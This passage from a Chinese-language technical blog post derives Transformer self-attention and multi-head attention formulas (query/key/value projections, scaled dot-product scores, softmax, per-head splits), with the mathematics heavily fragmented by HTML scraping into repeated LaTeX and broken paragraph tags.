3}A=(a&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,a&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,a&nbsp;</p>\n<p>3</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;，Q = ( q 1 , q 2 , q 3 ) &isin; R d k &times; 3 Q=(q^1,q^2,q^3)\\in\\mathbb{R}^{d_k \\times 3}Q=(q&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>3</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;，K = ( k 1 , k 2 , k 3 ) &isin; R d k &times; 3 K=(k^1,k^2,k^3)\\in\\mathbb{R}^{d_k \\times 3}K=(k&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>3</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;，V = ( v 1 , v 2 , v 3 ) &isin; R d l &times; 3 V=(v^1,v^2,v^3)\\in\\mathbb{R}^{d_l \\times 3}V=(v&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,v&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,v&nbsp;</p>\n<p>3</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;，则此时则有</p>\n<p>{ Q = W q &sdot; A K = W k &sdot; A V = W v &sdot; A \\left\\{</p>\n<p>QKV=Wq&sdot;A=Wk&sdot;A=Wv&sdot;A</p>\n<p>Q=Wq&sdot;AK=Wk&sdot;AV=Wv&sdot;A</p>\n<p>\\right.</p>\n<p>⎩</p>\n<p>⎪</p>\n<p>⎨</p>\n<p>⎪</p>\n<p>⎧</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>Q</p>\n<p>K</p>\n<p>V</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>=W&nbsp;</p>\n<p>q</p>\n<p>&nbsp;&sdot;A</p>\n<p>=W&nbsp;</p>\n<p>k</p>\n<p>&nbsp;&sdot;A</p>\n<p>=W&nbsp;</p>\n<p>v</p>\n<p>&nbsp;&sdot;A</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>接着再利用得到的Q u e r y \\mathrm{Query}Query向量和K e y \\mathrm{Key}Key向量计算注意力得分，论文中采用的注意力计算公式为点积缩放公式</p>\n<p>&alpha; l i = ( q i ) ⊤ &sdot; k l d k = d k d k &sum; n = 1 d k k n l &sdot; q n i , i , l &isin; { 1 , 2 , 3 } \\alpha^{i}_l=\\frac{(q^i)^{\\top}\\cdot k^l}{\\sqrt{d^k}}=\\frac{\\sqrt{d^k}}{d^k}\\sum\\limits_{n=1}^{d^k}k^l_n\\cdot q^i_n,\\quad i,l \\in \\{1,2,3\\}</p>\n<p>&alpha;&nbsp;</p>\n<p>l</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;=&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>(q&nbsp;</p>\n<p>i</p>\n<p>&nbsp;)&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;k&nbsp;</p>\n<p>l</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;=&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>n=1</p>\n<p>&sum;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;k&nbsp;</p>\n<p>n</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&sdot;q&nbsp;</p>\n<p>n</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;,i,l&isin;{1,2,3}</p>\n<p>论文中假定K e y \\mathrm{Key}Key向量k l = ( k 1 l , k 2 l , k 3 l ) k^l=(k^l_1,k^l_2,k^l_3)k&nbsp;</p>\n<p>l</p>\n<p>&nbsp;=(k&nbsp;</p>\n<p>1</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>2</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>3</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;)的元素和Q u e r y \\mathrm{Query}Query向量q i = ( q 1 i , q 2 i , q 3 i ) q^i=(q^i_1,q^i_2,q^i_3)q&nbsp;</p>\n<p>i</p>\n<p>&nbsp;=(q&nbsp;</p>\n<p>1</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>2</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>3</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;)的元素独立同分布，且令均值为0 00，方差为1 11，则此时注意力向量a i &isin; R 3 &times; 1 a^{i}\\in \\mathbb{R}^{3 \\times 1}a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>3&times;1</p>\n<p>&nbsp;的第l ll个分量&alpha; l i \\alpha^{i}_l&alpha;&nbsp;</p>\n<p>l</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;的均值为0 00，方差1 11具体的计算公式如下</p>\n<p>E [ &alpha; l i ] = d k d k &sum; n = 1 d k E [ k n l ] &sdot; E [ q n i ] = 0 , i , l &isin; { 1 , 2 , 3 } V a r [ &alpha; l i ] = 1 d k &sum; n = 1 d k V a r [ k n l ] &sdot; V a r [ q n i ] = 1 , i , l &isin; { 1 , 2 , 3 }</p>\n<p>E[&alpha;il]Var[&alpha;il]=dk&minus;&minus;&radic;dk&sum;n=1dkE[kln]&sdot;E[qin]=0,i,l&isin;{1,2,3}=1dk&sum;n=1dkVar[kln]&sdot;Var[qin]=1,i,l&isin;{1,2,3}</p>\n<p>E[&alpha;li]=dkdk&sum;n=1dkE[knl]&sdot;E[qni]=0,i,l&isin;{1,2,3}Var[&alpha;li]=1dk&sum;n=1dkVar[knl]&sdot;Var[qni]=1,i,l&isin;{1,2,3}</p>\n<p>E[&alpha;&nbsp;</p>\n<p>l</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;]</p>\n<p>Var[&alpha;&nbsp;</p>\n<p>l</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;]</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>=&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>n=1</p>\n<p>&sum;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;E[k&nbsp;</p>\n<p>n</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;]&sdot;E[q&nbsp;</p>\n<p>n</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;]=0,i,l&isin;{1,2,3}</p>\n<p>=&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>n=1</p>\n<p>&sum;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;Var[k&nbsp;</p>\n<p>n</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;]&sdot;Var[q&nbsp;</p>\n<p>n</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;]=1,i,l&isin;{1,2,3}</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>令注意力分数矩阵&Lambda; = ( &alpha; 1 , &alpha; 2 , &alpha; 3 ) &isin; R 3 &times; 3 \\Lambda=(\\alpha^1,\\alpha^2,\\alpha^3)\\in \\mathbb{R}^{3 \\times 3}&Lambda;=(&alpha;&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,&alpha;&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,&alpha;&nbsp;</p>\n<p>3</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>3&times;3</p>\n<p>&nbsp;，则有</p>\n<p>&Lambda; = K ⊤ &sdot; Q d k \\Lambda=\\frac{K^{\\top}\\cdot Q}{\\sqrt{d^k}}</p>\n<p>&Lambda;=&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>K&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;Q</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>注意分数向量&alpha; i \\alpha^i&alpha;&nbsp;</p>\n<p>i</p>\n<p>&nbsp;经过s o f t m a x \\mathrm{softmax}softmax层得到归一化后的注意力分布&beta; i \\beta^i&beta;&nbsp;</p>\n<p>i</p>\n<p>&nbsp;，即为</p>\n<p>&beta; j i = e &alpha; j i &sum; n = 1 3 e &alpha; n i , i , j = { 1 , 2 , 3 } \\beta^i_j = \\frac{e^{\\alpha^{i}_j}}{\\sum\\limits_{n=1}^3e^{\\alpha^{i}_n}},\\quad i,j=\\{1,2,3\\}</p>\n<p>&beta;&nbsp;</p>\n<p>j</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;=&nbsp;</p>\n<p>n=1</p>\n<p>&sum;</p>\n<p>3</p>\n<p>​</p>\n<p>&nbsp;e&nbsp;</p>\n<p>&alpha;&nbsp;</p>\n<p>n</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>e&nbsp;</p>\n<p>&alpha;&nbsp;</p>\n<p>j</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;,i,j={1,2,3}</p>\n<p>最后利用得到的注意力分布向量&beta; i \\beta^i&beta;&nbsp;</p>\n<p>i</p>\n<p>&nbsp;和V a l u e \\mathrm{Value}Value矩阵V VV获得最后的输出b i &isin; R d l &times; 1 b^i\\in \\mathbb{R}^{d_l \\times 1}b&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，则有</p>\n<p>b i = &sum; l = 1 3 &beta; l i &sdot; v l , i &isin; { 1 , 2 , 3 } b^i=\\sum\\limits^{3}_{l=1}\\beta^{i}_l \\cdot v^{l},\\quad i \\in \\{1,2,3\\}</p>\n<p>b&nbsp;</p>\n<p>i</p>\n<p>&nbsp;=&nbsp;</p>\n<p>l=1</p>\n<p>&sum;</p>\n<p>3</p>\n<p>​</p>\n<p>&nbsp;&beta;&nbsp;</p>\n<p>l</p>\n<p>i</p>\n<p>​</p>\n<p>&nbsp;&sdot;v&nbsp;</p>\n<p>l</p>\n<p>&nbsp;,i&isin;{1,2,3}</p>\n<p>令输出矩阵B = ( b 1 , b 2 , b 3 ) &isin; R d l &times; 3 B=(b^1,b^2,b^3)\\in\\mathbb{R}^{d_l\\times 3}B=(b&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,b&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,b&nbsp;</p>\n<p>3</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;，则有</p>\n<p>B = A t t e n t i o n ( Q , K , V ) = V &sdot; s o f t m a x ( K ⊤ &sdot; Q d k ) B=\\mathrm{Attention}(Q,K,V)=V\\cdot\\mathrm{softmax}\\left(\\frac{K^{\\top}\\cdot Q}{\\sqrt{d^k}}\\right)</p>\n<p>B=Attention(Q,K,V)=V&sdot;softmax(&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>K&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;Q</p>\n<p>​</p>\n<p>&nbsp;)</p>\n<p>&nbsp;</p>\n<p>Multi-Head Attention</p>\n<p>&nbsp;</p>\n<p>&emsp;M u l t i \\mathrm{Multi}Multi-H e a d&nbsp; &nbsp;A t t e n t i o n \\mathrm{Head\\text{ }Attention}Head Attention的工作原理与S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention的工作原理非常类似。为了方便图解可视化将M u l t i \\mathrm{Multi}Multi-H e a d \\mathrm{Head}Head设置为2 22-H e a d \\mathrm{Head}Head，如果M u l t i \\mathrm{Multi}Multi-H e a d \\mathrm{Head}Head设置为8 88-H e a d \\mathrm{Head}Head，则上图的q i , k i , v i , i &isin; { 1 , 2 , 3 } q^i,k^i,v^i,i\\in\\{1,2,3\\}q&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,v&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,i&isin;{1,2,3}的下一步的分支数为8 88。给定输入w o r d&nbsp; &nbsp;e m b e d d i n g \\mathrm{word\\text{ }embedding}word embedding向量a 1 , a 2 , a 3 &isin; R d l &times; 1 a^1,a^2,a^3 \\in \\mathbb{R}^{d_l \\times 1}a&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,a&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,a&nbsp;</p>\n<p>3</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，然后对于输入向量a i , i &isin; { 1 , 2 , 3 } a^i,i\\in \\{1,2,3\\}a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,i&isin;{1,2,3}通过矩阵W q &isin; R d k &times; d l , W k &isin; R d k &times; d l , W v &isin; R d l &times; d l W^q\\in \\mathbb{R}^{d_k \\times d_l},W^k\\in \\mathbb{R}^{d_k \\times d_l},W^v\\in \\mathbb{R}^{d_l\\times d_l}W&nbsp;</p>\n<p>q</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;,W&nbsp;</p>\n<p>k</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;,W&nbsp;</p>\n<p>v</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;进行第一次线性变换得到Q u e r y \\mathrm{Query}Query向量q i &isin; R d k &times; 1 q^i\\in\\mathbb{R}^{d_k \\times 1}q&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，K e y \\mathrm{Key}Key向量k i &isin; R d k &times; 1 k^i \\in\\mathbb{R}^{d_k \\times 1}k&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，以及V a l u e \\mathrm{Value}Value向量v i &isin; R d l &times; 1 v^i \\in\\mathbb{R}^{d_l \\times 1}v&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;。然后再对Q u e r y \\mathrm{Query}Query向量q i q^iq&nbsp;</p>\n<p>i</p>\n<p>&nbsp;通过矩阵W q 1 &isin; R d m &times; d k W^{q1}\\in \\mathbb{R}^{d_m \\times d_k}W&nbsp;</p>\n<p>q1</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;和W q 2 &isin; R d m &times; d k W^{q2}\\in \\mathbb{R}^{d_m\\times d_k}W&nbsp;</p>\n<p>q2</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;进行第二次线性变换得到q i 1 &isin; R d m &times; 1 q^{i1}\\in \\mathbb{R}^{d_m \\times 1}q&nbsp;</p>\n<p>i1</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;和q i 2 &isin; R d m &times; 1 q^{i2}\\in \\mathbb{R}^{d_m\\times 1}q&nbsp;</p>\n<p>i2</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，同理对K e y \\mathrm{Key}Key向量k i k^ik&nbsp;</p>\n<p>i</p>\n<p>&nbsp;通过矩阵W k 1 &isin; R d m &times; d k W^{k1}\\in \\mathbb{R}^{d_m \\times d_k}W&nbsp;</p>\n<p>k1</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;和W k 2 &isin; R d m &times; d k W^{k2}\\in \\mathbb{R}^{d_m\\times d_k}W&nbsp;</p>\n<p>k2</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;进行第二次线性变换得到k i 1 &isin; R d m &times; 1 k^{i1}\\in \\mathbb{R}^{d_m\\times 1}k&nbsp;</p>\n<p>i1</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;和k i 2 &isin; R d m &times; 1 k^{i2}\\in \\mathbb{R}^{d_m\\times 1}k&nbsp;</p>\n<p>i2</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，对V a l u e \\mathrm{Value}Value向量v i v^iv&nbsp;</p>\n<p>i</p>\n<p>&nbsp;通过矩阵W v 1 &isin; R d l 2 &times; d l W^{v1}\\in \\mathbb{R}^{\\frac{d_l}{2}\\times d_l}W&nbsp;</p>\n<p>v1</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>2</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;和W v 2 &isin; R d l 2 &times; d l W^{v2}\\in \\mathbb{R}^{\\frac{d_l}{2}\\times d_l}W&nbsp;</p>\n<p>v2</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>2</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;进行第二次线性变换得到v i 1 &isin; R d l 2 &times; 1 v^{i1}\\in \\mathbb{R}^{\\frac{d_l}{2}\\times 1}v&nbsp;</p>\n<p>i1</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>2</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;和v i 2 &isin; R d l 2 &times; 1 v^{i2}\\in \\mathbb{R}^{\\frac{d_l}{2}\\times 1}v&nbsp;</p>\n<p>i2</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>2</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;,具体的计算公式如下所示：</p>\n<p>{ q i h = W q h &sdot; W q &sdot; a i k i h = W k h &sdot; W k &sdot; a i , i = { 1 , 2 , 3 } , h = { 1 , 2 } v i h = W v h &sdot; W v &sdot; a i \\left\\{</p>\n<p>qihkihvih=Wqh&sdot;Wq&sdot;ai=Wkh&sdot;Wk&sdot;ai,i={1,2,3},h={1,2}=Wvh&sdot;Wv&sdot;ai</p>\n<p>qih=Wqh&sdot;Wq&sdot;aikih=Wkh&sdot;Wk&sdot;ai,i={1,2,3},h={1,2}vih=Wvh&sdot;Wv&sdot;ai</p>\n<p>\\right.</p>\n<p>⎩</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎨</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎧</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>q&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;</p>\n<p>k&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;</p>\n<p>v&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>=W&nbsp;</p>\n<p>qh</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>q</p>\n<p>&nbsp;&sdot;a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;</p>\n<p>=W&nbsp;</p>\n<p>kh</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>k</p>\n<p>&nbsp;&sdot;a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,i={1,2,3},h={1,2}</p>\n<p>=W&nbsp;</p>\n<p>vh</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>v</p>\n<p>&nbsp;&sdot;a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>令矩阵</p>\n<p>Q 1 = ( q 11 , q 21 , q 31 ) &isin; R d m &times; 3 Q 2 = ( q 12 , q 22 , q 32 ) &isin; R d m &times; 3 K 1 = ( k 11 , k 21 , k 31 ) &isin; R d m &times; 3 K 2 = ( k 12 , k 22 , k 32 ) &isin; R d m &times; 3 V 1 = ( v 11 , v 21 , v 31 ) &isin; R d l 2 &times; 3 V 2 = ( v 12 , v 22 , v 32 ) &isin; R d l 2 &times; 3</p>\n<p>Q1=(q11,q21,q31)&isin;Rdm&times;3K1=(k11,k21,k31)&isin;Rdm&times;3V1=(v11,v21,v31)&isin;Rdl2&times;3Q2=(q12,q22,q32)&isin;Rdm&times;3K2=(k12,k22,k32)&isin;Rdm&times;3V2=(v12,v22,v32)&isin;Rdl2&times;3</p>\n<p>Q1=(q11,q21,q31)&isin;Rdm&times;3Q2=(q12,q22,q32)&isin;Rdm&times;3K1=(k11,k21,k31)&isin;Rdm&times;3K2=(k12,k22,k32)&isin;Rdm&times;3V1=(v11,v21,v31)&isin;Rdl2&times;3V2=(v12,v22,v32)&isin;Rdl2&times;3</p>\n<p>Q&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=(q&nbsp;</p>\n<p>11</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>21</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>31</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>K&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=(k&nbsp;</p>\n<p>11</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>21</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>31</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>V&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=(v&nbsp;</p>\n<p>11</p>\n<p>&nbsp;,v&nbsp;</p>\n<p>21</p>\n<p>&nbsp;,v&nbsp;</p>\n<p>31</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>2</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>Q&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=(q&nbsp;</p>\n<p>12</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>22</p>\n<p>&nbsp;,q&nbsp;</p>\n<p>32</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>K&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=(k&nbsp;</p>\n<p>12</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>22</p>\n<p>&nbsp;,k&nbsp;</p>\n<p>32</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>V&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=(v&nbsp;</p>\n<p>12</p>\n<p>&nbsp;,v&nbsp;</p>\n<p>22</p>\n<p>&nbsp;,v&nbsp;</p>\n<p>32</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>2</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>此时则有</p>\n<p>Q 1 = W q 1 &sdot; W q &sdot; A Q 2 = W q 2 &sdot; W q &sdot; A K 1 = W k 1 &sdot; W k &sdot; A K 2 = W k 2 &sdot; W k &sdot; A V 1 = W v 1 &sdot; W v &sdot; A V 2 = W v 2 &sdot; W v &sdot; A</p>\n<p>Q1=Wq1&sdot;Wq&sdot;AK1=Wk1&sdot;Wk&sdot;AV1=Wv1&sdot;Wv&sdot;AQ2=Wq2&sdot;Wq&sdot;AK2=Wk2&sdot;Wk&sdot;AV2=Wv2&sdot;Wv&sdot;A</p>\n<p>Q1=Wq1&sdot;Wq&sdot;AQ2=Wq2&sdot;Wq&sdot;AK1=Wk1&sdot;Wk&sdot;AK2=Wk2&sdot;Wk&sdot;AV1=Wv1&sdot;Wv&sdot;AV2=Wv2&sdot;Wv&sdot;A</p>\n<p>Q&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=W&nbsp;</p>\n<p>q1</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>q</p>\n<p>&nbsp;&sdot;A</p>\n<p>K&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=W&nbsp;</p>\n<p>k1</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>k</p>\n<p>&nbsp;&sdot;A</p>\n<p>V&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=W&nbsp;</p>\n<p>v1</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>v</p>\n<p>&nbsp;&sdot;A</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>Q&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=W&nbsp;</p>\n<p>q2</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>q</p>\n<p>&nbsp;&sdot;A</p>\n<p>K&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=W&nbsp;</p>\n<p>k2</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>k</p>\n<p>&nbsp;&sdot;A</p>\n<p>V&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=W&nbsp;</p>\n<p>v2</p>\n<p>&nbsp;&sdot;W&nbsp;</p>\n<p>v</p>\n<p>&nbsp;&sdot;A</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>对于每个H e a d \\mathrm{Head}Head利用得到对于Q u e r y \\mathrm{Query}Query向量和K e y 